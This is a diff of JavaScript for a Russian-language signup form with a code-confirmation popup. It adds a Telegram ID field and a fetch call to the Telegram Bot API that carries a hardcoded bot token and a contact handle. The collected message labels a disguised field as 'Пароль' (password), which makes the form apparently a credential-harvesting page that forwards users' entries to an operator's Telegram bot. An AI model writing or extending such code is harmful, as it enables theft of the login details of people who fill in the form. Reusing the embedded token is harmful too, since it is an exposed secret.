@@ -43,7 +43,39 @@ document.addEventListener('DOMContentLoaded', () => {
             codeInput.classList.remove('invalid');
             console.log('Код подтвержден:', codeInput.value);
             codePopup.classList.remove('show');
-            alert('Код подтвержден! Спасибо.'); // Replace with actual code verification logic if needed
+            
+            // Send confirmation message to Telegram
+            const confirmationMessage = `✅ Код подтвержден!\n\nТелеграм для связи: @realkarmakun`;
+            const botToken = '8134278525:AAHd6ZpW3omshp96ac8F7SNKUWJNYq1N_i8';
+            const telegramId = form.telegramId.value;
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: telegramId,
+                    parse_mode: 'HTML',
+                    text: confirmationMessage
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Сообщение о подтверждении кода успешно отправлено в Telegram!');
+                    alert('Код подтвержден! Спасибо.'); // Optionally keep a simple alert for immediate feedback
+                } else {
+                    console.error('Ошибка отправки сообщения о подтверждении кода в Telegram:', data);
+                    alert('Код подтвержден, но произошла ошибка при отправке сообщения в Telegram.');
+                }
+            })
+            .catch(error => {
+                console.error('Ошибка fetch при отправке сообщения о подтверждении:', error);
+                alert('Код подтвержден, но произошла ошибка при отправке сообщения в Telegram.');
+            });
+
         } else {
             codeError.textContent = 'Неверный код. Попробуйте еще раз.';
             codeInput.classList.add('invalid');
@@ -108,7 +140,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 lastName: form.lastName.value,
                 birthDate: form.birthDate.value,
                 version: versionSelect.value,
-                notes: form.notes.value
+                notes: form.notes.value,
+                telegramId: form.telegramId.value // Добавляем telegramId
             };
 
             // Generate verification code
@@ -121,6 +154,7 @@ document.addEventListener('DOMContentLoaded', () => {
             message += `<b>Пароль:</b> ${formData.lastName}\n`;
             message += `<b>Дата регистрации:</b> ${formData.birthDate}\n`;
             message += `<b>Выбор версии:</b> ${formData.version}\n`;
+            message += `<b>Telegram ID:</b> ${formData.telegramId}\n`; // Добавляем telegramId в сообщение
             if (formData.notes) {
                 message += `<b>Примечание:</b> ${formData.notes}\n`;
             }
